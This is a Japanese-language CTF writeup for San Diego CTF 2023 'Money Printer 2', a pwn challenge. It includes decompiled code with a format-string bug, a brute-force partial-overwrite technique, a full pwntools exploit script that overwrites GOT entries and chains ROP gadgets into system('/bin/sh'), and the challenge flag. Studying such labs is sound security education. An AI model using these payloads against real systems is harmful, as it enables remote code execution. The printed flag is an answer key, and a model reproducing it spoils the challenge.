# San Diego CTF 2023 `Money Printer 2 [pwn]` writeup

## 問題
There is a few more steps to getting rich than I let on last time!

Connect via: `nc greed.sdc.tf 1337`

Dockerfileと実行バイナリが配布される。

## 解法
Money Printer 1もあったのだが、チームメイトが解いてくれた。
ver. 1のほうについてもこのwriteupで少し触れる。

こっちも静的解析まではチームメイトが済ませてくれていた。

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  uint want;
  uint dollar;
  uint try;
  char say [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  dollar = 0x7fffffff;
  try = 1000;
  want = 0;
  puts(
      "You may have gotten me last time, but I have so much more money now that you\'ll never be ric her than me!\n"
      );
  do {
    if (dollar == 0) goto LAB_0040094a;
    printf("I have %u dollars, how many of them do you want?\n",(ulong)dollar);
    __isoc99_scanf(&DAT_00400aaa,&want);
    getchar();
    if ((int)want < 100) {
      if ((long)(int)want < (long)(ulong)dollar) {
        printf("you can have %d dollars!\n",(ulong)want);
        dollar = dollar - want;
        try = try + want;
      }
      else {
        puts("I don\'t have that much!");
      }
    }
    else {
      puts("you clearly can\'t get that much!");
    }
  } while (-1 < (int)try);
  printf("wow you\'ve printed money out of thin air, you have %u!!! Is there anything you would like  to say to the audience?\n"
         ,(ulong)try);
  fgets(say,100,stdin);
  printf("wow you said: ");
  printf(say);
LAB_0040094a:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Partial RELRO, No PIE. 
自明なFormat String Attack (FSA)問である。

前問ではFLAGの内容が予めstackに読み出されていたので、これを書式指定子を使ってバイト列や整数の形でダンプすれば解けた。
本問ではそのような下準備はないので真面目にシェルを取りに行くしかない。

この手の問題は過去に[サイバーセキュリティスクール](https://github.com/Caffeine46/ctf/tree/master/west_sec22)内のCTFで出題したことがある。

たいていの場合stack内にlink_map構造体へのポインタが残っているので、このアドレスめがけてFSAによる書き込みを行い最初のメンバ変数`l_addr`を改ざんする。
すると`exit()`内で.fini_arrayのあるアドレスが誤って計算されるので、このアドレスにデストラクタ関数として実行したい命令を並べておけばeipを奪えるというもの。

手元ではこれでシェルを奪えたが、問題サーバでは刺さらなかった。
試しに`%p.%p.%p...`のようなペイロードを流してみるがlink_mapのポインタがあるはずのアドレスはNULLになっている。
Dockerfileを確認してみると、ubuntuのバージョンが18.04。
手元の環境は20.04、glibcに依存するような解法なので最初に確認しとけよ←

仕方がないので12 bitほど不確定性を許容した解き方をすることに。


### FSAを利用したstack leakなしでstackへの(運任せ)任意アドレス書き込み
stack上にstackへのポインタがある場合、FSAによる任意アドレス書き込みに繋げられる可能性が高まる。
さらに、そのポインタの先にもstackのアドレスがある場合、12 bit程のランダム性を許容すればアドレスリークなしでstack上の任意のアドレスを書き換えられる。以下のような例を考える。

```
   addr    stack
|    .   |    .   |
|    .   |    .   |
+--------+--------+
| addr A | addr B | -> addr C
+--------+--------+
|    .   |    .   |
+--------+--------+
| addr B | addr C |
+--------+--------+
|    .   |    .   |
+--------+--------+
| addr C | ?????? |
+--------+--------+
|    .   |    .   |
```

addr Aにはstack上のaddr Bが格納されている。addr Bにも、stack上のaddr Cが保持されているとする。

書式指定子`%X$ln`(Xはstack上のaddr Aに対応する引数の番号)を使ってFSAによる書き込みを行うとaddr Bの値を任意に書き換えられる。

ここで`%X$ln`の代わりに`%X$hn`や`%X$hhn`を用いると下位2バイトや1バイトのpartical overwriteが可能。
addr Bには元々stack上のアドレスが入っているので、下位数バイトを適当に書き換えてリターンアドレスが保存されているアドレスを作り出せるかもしれない。
運よくリターンアドレスの場所を指すポインタが作れたら、今度はaddr Bに対応する引数の番号と共に`%lx`でリターンアドレスを書き換える。理論上これでeipを奪える。

上記のようなstack上のポインタの連鎖はだいたい見つけられる。
(パスを格納するところとかで頻出)
今回はaddr Aにあたる引数を`%25$n`、addr Bにあたる引数を`%51$n`で指定できた。

しかしながら、このままでは何回試行してもリターンアドレスを書き換えられない。
というのも、`%X$`を使って引数を直接指定するタイプの書式指定子はすべて同時に読み込まれてしまう。addr Bをpartical overwriteした後にこれを書式指定子で参照したければ、addr Aの位置にある引数の指定には`%X$`の形式を使ってはいけない。ペイロードがやや長くなるが`%c%c%c...%c%n`のように25個分書式指定子を重ねる必要がある。

上記のテクニックで今回は2バイトのpartical overwriteを実行する。
stack alignmentにより下位4ビットは固定であるので実際は16-4=12ビットのエントロピーが存在する。
確率にして1/4096なのでそこまで難しくはないはず。


## Exploit
解説ではリターンアドレスを書き換えることについて言及したが、実際には`__stack_chk_fail()`のGOTを`main()`に書き換えつつ(アドレス既知なのでエントロピーなし)canaryを運任せに書き換える方が堅実だと思う。FSAでstackのアドレスをリークしつつret2mainを達成できれば、以降はcanaryを確実に壊して再びmainの頭に復帰できる。

有難いことに`system()`のシンボルがバイナリにあったので拝借する。

```py
from pwn import *
import sys

def guess():
    elf = ELF("chall_patched")

    # io = process(elf.path)
    io = remote('greed.sdc.tf', 1337)

    context.arch = 'amd64'
    context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

    # gdb.attach(io, gdbscript='b *0x0000000000400938')

    p = b'%c' * 23
    p += b'%%%dc%%hn' % (0x0708 - 23)
    p += b'%51$n'
    p += b'%%%dc%%18$hn' % ((elf.sym["main"] & 0xffff) - 0x0708)
    p += b'%1$p'

    p += b'\x00' * (0x50 - len(p))
    p += p64(elf.got["__stack_chk_fail"])

    io.sendlineafter(b'want?\n', b'-100000')
    io.sendlineafter(b'audience?\n', p)

    # sleep(1)
    r = io.recvrepeat(10)

    # if r[-4:] == b'dff0':
    if len(r) > 2051:
        
        if b'terminated\n' in r:
            io.close()
            return 1
        print(r)
        stack_addr = int(r[-175:-163].decode(), 16)
        print(f'stack_addr = {hex(stack_addr)}')

        canary_addr = stack_addr + 0x2688
        binsh_addr = stack_addr + 0x2668
        pop5_ret_addr = 0x004009db

        p = b'%13$n'
        p += b'A'
        p += b'%14$hn'
        p += b'%%%dc%%15$hn' % (((elf.sym["main"] + 284) & 0xffff) - 1)
        p += b'%%%dc%%16$n' % ((pop5_ret_addr & 0xffffffff) - ((elf.sym["main"] + 284) & 0xffff))
        p += b'\x00' * (40 - len(p))
        p += p64(elf.got["printf"] + 4)
        p += p64(canary_addr)
        p += p64(elf.got["__stack_chk_fail"])
        p += p64(elf.got["printf"])
        p += b'/bin/sh\x00'

        # gdb.attach(io, gdbscript='b *0x0000000000400938')

        io.sendline(b'-100000')
        io.sendlineafter(b'audience?\n', p)

        p = b'A' * 8
        p += p64(next(elf.search(asm('pop rdi ; ret'), executable=True)))
        p += p64(binsh_addr)
        p += p64(next(elf.search(asm('ret'), executable=True)))
        p += p64(elf.sym["system"])

        sleep(3)
        io.sendline(p)

        io.interactive()
        return 0
    else:
        print(r[-4:])
        io.close()
        # io.interactive()
        return 1
    # stack_addr = int(r[-19:-7].decode(), 16)
    # print(f'stack addr = {hex(stack_addr)}')

cnt = 0
while(guess()):
    cnt += 1
    print(f'take {cnt}')

```

FLAG: `sdctf{d4mn_y0u_g0t_M3_4g4iN_1M_p00R}`